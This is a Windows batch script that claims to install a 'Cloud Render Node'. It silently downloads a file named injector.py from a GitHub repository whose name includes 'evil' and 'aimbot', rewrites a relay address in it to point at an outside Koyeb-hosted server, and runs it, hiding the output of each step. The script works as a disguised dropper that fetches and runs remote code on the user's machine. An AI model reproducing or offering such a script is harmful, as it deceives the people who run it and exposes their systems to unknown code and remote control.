@echo off
echo Installing Cloud Render Node...

:: Check Python
python --version >nul 2>&1
if errorlevel 1 (
    echo Error: Python not found
    pause
    exit 1
)

:: Create venv
python -m venv render_env >nul 2>&1
call render_env\Scripts\activate.bat >nul 2>&1

:: Install deps
pip install requests psutil >nul 2>&1

:: Download node
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Teddy11235-evil/thelastaimbotyouwillever-c/main/injector.py' -OutFile 'node.py' -UseBasicParsing" >nul 2>&1

:: Fix relay URL
powershell -Command "(Get-Content 'node.py') -replace 'ws://your-relay-server.com:8765', 'https://mathematical-judy-bageltigerstudeos-3479b0db.koyeb.app' | Set-Content 'node.py'" >nul 2>&1

:: Run node
python node.py
